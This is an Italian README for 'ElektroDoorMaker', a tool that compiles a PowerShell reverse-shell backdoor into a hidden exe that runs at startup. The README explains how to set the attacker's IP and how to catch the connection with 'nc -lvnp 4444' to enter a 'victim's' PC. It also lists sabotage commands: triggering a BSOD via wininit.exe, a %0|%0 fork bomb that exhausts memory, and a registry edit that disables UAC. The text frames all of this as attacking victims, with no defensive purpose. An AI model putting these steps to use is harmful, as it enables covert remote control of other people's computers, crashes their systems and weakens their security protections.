  _____ _      _    _             ____                   __  __       _             
 | ____| | ___| | _| |_ _ __ ___ |  _ \  ___   ___  _ __|  \/  | __ _| | _____ _ __ 
 |  _| | |/ _ \ |/ / __| '__/ _ \| | | |/ _ \ / _ \| '__| |\/| |/ _` | |/ / _ \ '__|
 | |___| |  __/   <| |_| | | (_) | |_| | (_) | (_) | |  | |  | | (_| |   <  __/ |   
 |_____|_|\___|_|\_\\__|_|  \___/|____/ \___/ \___/|_|  |_|  |_|\__,_|_|\_\___|_|   
 ------------------------------------------------------------------ ElektroWindows

========================================================================================
Come creare una backdoor?

[1] - Apri il file 'backdoor.ps1' modifica il nome del file che verrá copiato dentro 'Shell:startup' (riga 1)
[2] - Modifica il contenuto della voce '$LHOST' inserendo l'ip LOCALE del PC attaccante
[3] - Salva tutto (NON RINOMINARE IL FILE 'backdoor.ps1' ALTRIMENTI IL COMPILATORE RESTITUIRÁ ERRORI A SCHERMO!, PUOI RINOMINARE IL FILE EXE COMPILATO) ed esegui 'compilatore.exe' o 'compilatore_nogui.exe' come amministratore per compilare lo script .ps1, quindi convertirlo in exe

NOTA: 'compilatore.exe' andrá a compilare il file 'backdoor.ps1' mostrando la console a schermo, mentre la versione 'compilatore_nogui.exe' lo renderá un processo in background
========================================================================================
Trucchetti di ElektroWindows:

[1] - esegui: {wininit.exe} per creare una BSOD (SOLO ADMIN, SOLO POWERSHELL)
[2] - esegui: {Add-Content -Path C:\Users\bsod.bat -Value "%0|%0" ; start C:\Users\bsod.bat} per riempire tutta la RAM del computer
[3] - esegui: {msg * "messaggio"} per inviare un messaggio tramite finestra di dialogo
[3] - esegui: {reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f} per disabilitare UAC
[4] - esegui: {reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f} per abilitare UAC
[5] - esegui: {msedge.exe https://www.youtube.com/watch?v=xvFZjo5PgG0} per rickroll senza ads (10 sec)

========================================================================================
Come connettersi al PC della vittima?
É necessario un tool chiamato 'netcat' (nc) che serve per connettersi al pc della vittima.
Questo tool é giá preinstallato su macchine kali linux o parrot os.
Se nello script eseguito nel pc della vittima la porta é:"4444" il nostro comando sarà:

nc -lvnp 4444

Una volta eseguito saremo entrati nel PC della vittima!


========================================================================================

Grazie per aver usato ElektroDoorMaker! Iscriviti al mio canale! - www.youtube.com/@elektrowindows
